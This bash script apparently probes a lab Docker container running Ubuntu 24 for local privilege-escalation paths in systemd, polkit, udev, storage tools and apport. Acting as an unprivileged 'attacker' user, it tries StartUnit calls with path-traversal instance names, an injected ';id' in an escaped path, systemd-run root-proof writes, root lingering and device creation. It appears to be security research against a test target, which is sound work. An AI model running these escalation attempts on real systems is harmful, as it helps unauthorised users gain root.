#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

de() {
  docker exec "$container" bash -lc "$1"
}

section() {
  printf '\n== %s ==\n' "$1"
}

section "target and package proof"
de 'id attacker; sed -n "1,8p" /etc/os-release; systemctl --version | head -1; dpkg-query -W -f="\${binary:Package}\t\${Version}\t\${db:Status-Abbrev}\n" systemd systemd-sysv dbus dbus-daemon polkitd apport e2fsprogs mdadm lvm2 multipath-tools lxd-installer usb-modeswitch xfsprogs util-linux 2>/dev/null | sort'

section "default template services and specifier execs"
de 'find /usr/lib/systemd/system /lib/systemd/system -maxdepth 1 -type f -name "*@.service" -printf "%p\n" 2>/dev/null | sort -u'
de 'grep -RHE "^(Exec(Start|StartPre|StartPost|Reload|Stop|StopPost)|User|Group|WorkingDirectory|PIDFile|RuntimeDirectory|StateDirectory|LogsDirectory|CacheDirectory|ReadWritePaths|BindPaths|Environment|EnvironmentFile)=.*%[iIffnNpPcC]" /usr/lib/systemd/system/*@.service /lib/systemd/system/*@.service 2>/dev/null || true'

section "package owners for template and activation inputs"
de 'for p in /usr/lib/systemd/system/*@.service /usr/lib/systemd/system/*@.socket /usr/lib/systemd/system/*@.timer /lib/systemd/system/mdadm-grow-continue@.service /lib/systemd/system/mdadm-last-resort@.service /lib/systemd/system/mdadm-last-resort@.timer /lib/systemd/system/mdmon@.service /lib/systemd/system/usb_modeswitch@.service /usr/lib/udev/rules.d/99-systemd.rules /lib/udev/rules.d/63-md-raid-arrays.rules /lib/udev/rules.d/64-md-raid-assembly.rules /usr/lib/udev/rules.d/69-lvm.rules /usr/lib/udev/rules.d/60-multipath.rules; do dpkg -S "$p" 2>/dev/null || true; done | sort -u'

section "unit, udev, dbus, and generator references"
de 'grep -RHE "(@[A-Za-z0-9_.\\-]*\\.(service|socket|timer)|[A-Za-z0-9_.\\-]+@.*\\.(service|socket|timer))" /usr/lib/systemd/system /lib/systemd/system /run/systemd/generator* /etc/systemd/system 2>/dev/null | sed -n "1,260p" || true'
de 'grep -RHE "SYSTEMD_WANTS|systemctl|systemd-run|SystemdService|@|Exec=.*systemd" /usr/lib/udev/rules.d /lib/udev/rules.d /usr/share/dbus-1/system-services /usr/share/dbus-1/system.d 2>/dev/null | sed -n "1,260p" || true'
de 'find /usr/lib/systemd/system-generators /lib/systemd/system-generators /etc/systemd/system-generators /run/systemd/generator /run/systemd/generator.early /run/systemd/generator.late -maxdepth 2 -type f -printf "%M %u:%g %p\n" 2>/dev/null | sort; grep -RHE "@|%[iIf]" /run/systemd/generator /run/systemd/generator.early /run/systemd/generator.late 2>/dev/null || true'

section "current live instances"
de 'systemctl list-units --all --no-pager --no-legend "*@*" | sort || true'

section "systemd1 manage-units gate and direct template starts"
de 'pkaction --verbose --action-id org.freedesktop.systemd1.manage-units 2>/dev/null | sed -n "1,80p"; runuser -u attacker -- bash -lc "pkcheck --action-id org.freedesktop.systemd1.manage-units --process \$\$ --allow-user-interaction 2>&1; echo pkcheck_rc=\$?"'
de 'runuser -u attacker -- id; for u in modprobe@fuse.service systemd-fsck@dev-vda1.service user@0.service lxd-installer@probe.service e2scrub@tmp-probe.service systemd-journald@probe.service; do echo "UNIT=$u"; timeout 5 runuser -u attacker -- busctl call --system org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit ss "$u" replace 2>&1 || true; done; rm -f /tmp/systemd-template-root-proof; timeout 5 runuser -u attacker -- systemd-run --unit systemd-template-probe /bin/sh -c "id > /tmp/systemd-template-root-proof" 2>&1 || true; stat -Lc "%A %U:%G %s %n" /tmp/systemd-template-root-proof 2>&1 || true'
de 'for u in "systemd-backlight@backlight:../../tmp/lpe.service" "systemd-journald@../../tmp/lpe.service" "usb_modeswitch@../../tmp/lpe.service"; do echo "UNIT=$u"; timeout 5 runuser -u attacker -- busctl call --system org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager StartUnit ss "$u" replace 2>&1 || true; done; systemd-escape --template=systemd-fsck@.service --path "/tmp/a;id"; systemd-escape --template=systemd-growfs@.service --path "/tmp/a b"; systemd-escape --template=systemd-backlight@.service "backlight:../../tmp/lpe"'

section "socket activation reachability"
de 'stat -Lc "%A %U:%G %n" /run/apport.socket /run/lxd-installer.socket /run/systemd/io.systemd.sysext /run/systemd/io.systemd.PCRExtend /run/systemd/journal.probe/stdout /run/systemd/journal.probe/socket 2>&1 || true; runuser -u attacker -- python3 - <<'"'"'PY'"'"'
import socket
for path in ["/run/apport.socket","/run/lxd-installer.socket","/run/systemd/io.systemd.sysext","/run/systemd/io.systemd.PCRExtend","/run/systemd/journal.probe/stdout","/run/systemd/journal.probe/socket"]:
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        s.settimeout(1)
        s.connect(path)
        print(f"CONNECT {path}: ok")
    except Exception as e:
        print(f"CONNECT {path}: {type(e).__name__}: {e}")
    finally:
        s.close()
PY'

section "login1 user@ instance boundary"
de 'runuser -u attacker -- bash -lc "loginctl enable-linger attacker 2>&1; echo enable_self_rc=\$?"; sleep 1; systemctl status user-runtime-dir@1001.service user@1001.service user@0.service --no-pager --full 2>&1 | sed -n "1,180p"; stat -Lc "%A %U:%G %n" /run/user/1001 /var/lib/systemd/linger/attacker 2>&1 || true; runuser -u attacker -- bash -lc "loginctl disable-linger attacker 2>&1; echo disable_self_rc=\$?"; runuser -u attacker -- bash -lc "loginctl enable-linger root 2>&1; echo root_linger_rc=\$?; loginctl enable-linger selfauth 2>&1; echo other_linger_rc=\$?"; loginctl terminate-user attacker 2>/dev/null || true; systemctl stop user@1001.service user-runtime-dir@1001.service 2>/dev/null || true; systemctl is-active user@1001.service user-runtime-dir@1001.service 2>&1 || true'

section "udev, storage, and network name gates"
de 'runuser -u attacker -- bash -s <<'"'"'EOS'"'"'
id
grep Cap /proc/self/status
stat -Lc "%A %U:%G %n" /run/udev/control /dev/loop-control /dev/mapper/control 2>&1 || true
udevadm trigger --verbose --dry-run --subsystem-match=backlight --action=add 2>&1 | sed -n "1,20p"
echo backlight_dry_rc=$?
udevadm trigger --verbose --dry-run --subsystem-match=block --action=add 2>&1 | sed -n "1,40p"
echo block_dry_rc=$?
rm -f /tmp/lpeblock /tmp/lpe-loop.img
mknod /tmp/lpeblock b 7 200 2>&1
echo mknod_rc=$?
dd if=/dev/zero of=/tmp/lpe-loop.img bs=1M count=1 status=none
losetup -f /tmp/lpe-loop.img 2>&1
echo losetup_attach_rc=$?
udisksctl loop-setup -f /tmp/lpe-loop.img 2>&1
echo udisks_loop_rc=$?
ip link add name lpe0 type dummy 2>&1
echo ip_add_rc=$?
ip link set lo name lpe0 2>&1
echo ip_rename_rc=$?
rm -f /tmp/lpe-loop.img
EOS'

section "path, timer, coredump, and generator input gates"
de 'systemctl status apport-autoreport.path apport-autoreport.timer --no-pager --full 2>&1 | sed -n "1,140p"; echo core_pattern=$(cat /proc/sys/kernel/core_pattern); systemctl list-unit-files --no-pager "systemd-coredump*" "apport-coredump-hook@.service"'
de 'runuser -u attacker -- bash -s <<'"'"'EOS'"'"'
id
for p in /usr/lib/systemd/system /etc/systemd/system /run/systemd/generator /proc/cmdline /etc/fstab /etc/crypttab /etc/init.d /etc/rc.local /var/lib/snapd /var/lib/apport /var/lib/apport/autoreport /var/crash /run/systemd/ask-password; do
  printf "PATH=%s " "$p"
  stat -Lc "%A %U:%G" "$p" 2>&1 || true
  test -w "$p"
  echo "write_rc=$?"
done
touch /var/lib/apport/autoreport 2>&1
echo touch_autoreport_rc=$?
touch /run/systemd/ask-password/probe 2>&1
echo touch_askpass_rc=$?
EOS'

section "root proof check"
de 'stat -Lc "%A %U:%G %s %n" /tmp/systemd-template-root-proof 2>&1 || true; test ! -e /tmp/systemd-template-root-proof && echo "no_root_proof_file"'
